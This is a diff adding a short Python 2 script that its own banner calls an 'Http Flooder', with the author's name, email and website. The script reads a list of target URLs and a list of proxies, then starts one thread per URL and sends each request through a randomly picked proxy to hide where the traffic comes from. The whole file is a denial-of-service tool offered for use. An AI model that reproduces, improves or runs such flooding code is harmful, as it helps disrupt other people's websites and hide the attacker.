@@ -1,0 +1,88 @@
+import subprocess
+import threading
+import urllib2 
+import random
+print '''  
+             ___       ___       ___   
+            /\__\     /\  \     /\  \  
+           /:/__/_   /::\  \    \:\  \ 
+          /::\/\__\ /::\:\__\   /::\__\
+          
+          \/\::/  / \:\::/  /  /:/\/__/
+            /:/  /   \::/  /   \/__/   
+            \/__/     \/__/          
+         [securmind@gmail.com ] 
+    .-={------------------------------------}=-.
+    .-={    Code by :Reza Mansouri         }=-.
+    .-={    WebSite: www.r-mansori.ir         }=-.
+    .-={    Data : 2013/7/23                }=-.
+        .-={    Version : 0.1                   }=-.
+        .-={    Http Flooder 0.1                ]=-.
+    .-={------------------------------------}=-.
+            '''
+class Crawler(object):
+    hosts = []
+    thread_count = 2
+    lock = threading.Lock()
+    proxies = []
+
+    def get(self, url):
+        try:
+            proxy_index = random.randint(0, len(self.proxies) -1)
+            print "proxies[%d] = %s" % (proxy_index, self.proxies[proxy_index])
+            proxy_support = urllib2.ProxyHandler({"http": self.proxies[proxy_index]})
+            opener = urllib2.build_opener(proxy_support)
+            urllib2.install_opener(opener)
+            urllib2.urlopen(url)
+        except:
+            print 'Error'
+            pass
+
+    def pop_queue(self):
+        url = None
+
+        self.lock.acquire() 
+
+        if self.hosts:
+            url = self.hosts.pop()
+
+        self.lock.release() 
+
+        return url
+
+    def dequeue(self):
+        while True:
+            url = self.pop_queue()
+
+            if not url:
+                return None
+            
+            self.get(url)
+
+    def start(self):
+        threads = []
+
+        for i in range(self.thread_count):
+            t = threading.Thread(target=self.dequeue)
+            t.start()
+            threads.append(t)
+
+        [ t.join() for t in threads ]
+
+        return "Finished"
+
+if __name__ == '__main__':
+    crawler = Crawler()
+    
+    with open(raw_input(".-={ Enter the URLs file path: ")) as f:
+        for row in f:
+            crawler.hosts.append(row)
+            
+    crawler.thread_count = len(crawler.hosts)
+    
+    with open(raw_input(".-={ Enter the Proxies file path: ")) as f:
+        for row in f:
+            print 'read proxy from file: %s' % row # print read proxy list 
+            crawler.proxies.append(row)
+
+    print crawler.start()  
